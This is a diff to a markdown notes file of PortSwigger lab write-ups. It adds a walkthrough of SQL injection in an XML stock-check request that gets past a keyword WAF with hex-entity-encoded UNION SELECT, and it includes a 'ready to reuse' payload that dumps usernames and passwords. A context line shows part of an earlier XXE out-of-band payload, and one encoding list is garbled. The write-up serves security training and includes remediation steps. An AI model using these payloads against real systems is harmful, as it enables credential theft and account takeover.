@@ -2285,7 +2285,7 @@ Detect SQL + XXE hybrid payloads.
 
 ---
 
-# Lab-13 Blind Asynchronous SQL Injection + XXE OAST Password Exfiltration (PortSwigger Lab)
+# Lab-14 Blind Asynchronous SQL Injection + XXE OAST Password Exfiltration (PortSwigger Lab)
 
 ---
 
@@ -2412,5 +2412,221 @@ x'+UNION+SELECT+EXTRACTVALUE( xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM
 - Block outbound DNS except internal resolvers  
 - Restrict Oracle functions (`xmltype`, `EXTRACTVALUE`)  
 - Add WAF rules detecting XXE-in-SQL patterns  
+
+---
+
+# Lab-15 XML SQL Injection + WAF Bypass via Encoded UNION (PortSwigger Lab)
+
+---
+
+## 🔹 One-line summary
+WAF-evaded SQL injection inside XML input using encoded UNION SELECT to extract the administrator’s password.
+
+---
+
+## 🔹 What is this topic? (short)
+This lab demonstrates that SQL injection can occur inside XML-based input when the backend embeds XML fields directly into SQL queries without sanitization.
+
+To block attackers, a WAF filters obvious SQL keywords (UNION, SELECT, etc.).  
+We bypass this by sending the same keywords using *XML-encoded characters*, allowing us to execute a UNION SELECT injection even when the WAF is enabled.
+
+Only one column is returned by the stock query, so we concatenate:  
+username || '~' || password  
+to extract both values in a single output column.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+Modern APIs often use XML or JSON, but the backend still performs unsafe SQL concatenation.
+
+Attackers can:
+- bypass WAFs using encoding techniques  
+- inject SQL through API bodies instead of URL params  
+- exfiltrate sensitive data through legitimate API responses  
+- compromise admin accounts  
+- fully bypass keyword-based filtering  
+
+This vulnerability appears frequently in:
+- SOAP services  
+- XML-based inventory systems  
+- enterprise ERP APIs  
+- mobile app API gateways  
+- IoT/Smart device APIs  
+
+Encoding-based WAF evasion is extremely common in real-world attacks.
+
+---
+
+## 🔹 High-value injection points
+Common XML injection locations include:
+
+- <storeId>  
+- <productId>  
+- <quantity>  
+- <location>  
+- <user> fields  
+- Any endpoint with:  
+  Content-Type: application/xml  
+  or  
+  Content-Type: text/xml
+
+Always test:
+- 1+1  
+- '  
+- 1 UNION SELECT NULL  
+- encoded UNION payloads  
+
+---
+
+## 🔹 Quick concept checklist
+- SQLi in XML body  
+- WAF blocks raw SQL keywords  
+- Bypass via XML entity encoding (&#xXX;)  
+- Determine column count  
+- Use encoded UNION  
+- Extract admin credentials  
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+### 1. Send request to Repeater
+Send the stock-check request:
+
+<stockCheck>
+    <storeId>1</storeId>
+    <productId>1</productId>
+</stockCheck>
+```Modify:
+
+<storeId>1+1</storeId>
+
+Response changes → SQL injection confirmed.
+
+
+---
+
+### 2. Try UNION SELECT (blocked by WAF)
+
+<storeId>1 UNION SELECT NULL</storeId>
+
+WAF blocks it → we need encoding.
+
+
+---
+
+### 3. Encode SQL keywords to bypass WAF
+
+Encode characters into XML hex entities:
+
+Example encoding:
+
+U → U
+
+N → N
+
+I → I
+
+O → O
+
+N → N
+
+
+Thus:
+
+UNION SELECT becomes:
+
+&#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;
+
+Backend decodes → WAF bypassed.
+
+
+---
+
+### 4. Determine number of columns
+
+After encoding, test:
+
+1 UNION SELECT NULL
+
+Works.
+
+Testing NULL, NULL fails → only one column allowed.
+Must concatenate extracted fields.
+
+
+---
+
+### 5. Final extraction payload
+
+Final XML with encoded UNION + SELECT:
+
+<stockCheck>
+    <storeId>
+        1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; username || '~' || password FROM users
+    </storeId>
+    <productId>1</productId>
+</stockCheck>
+
+The application returns:
+
+administrator~<password_here>
+
+Extract password → log in.
+
+
+---
+
+### 6. Log in as administrator
+
+Use the leaked password → solve the lab.
+
+
+---
+
+## 🔹 PoC payload (ready to reuse)
+
+1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; username || '~' || password FROM users
+
+
+---
+
+## 🧾 Evidence (Screenshot)
+
+1️⃣ Screenshot — Final encoded XML UNION SQLi dumping admin password
+![XML admin password](../images/final-encoded-xml-sqli-dump.png)
+
+---
+
+## 🔹 Troubleshooting
+
+WAF blocking → encode more characters
+
+Wrong number of columns → only 1 allowed
+
+XML parser error → malformed XML
+
+No SQLi effect → confirm content-type = application/xml
+
+
+
+---
+
+## 🔹 Remediation
+
+Use prepared statements
+
+Validate XML structure serverside
+
+Enforce type constraints (integer-only IDs)
+
+Disable detailed SQL output
+
+Deploy schema validation (XSD)
+
+Use robust WAF rules (not keyword-only)
+
+Apply least-privilege DB roles
+
 
 ---
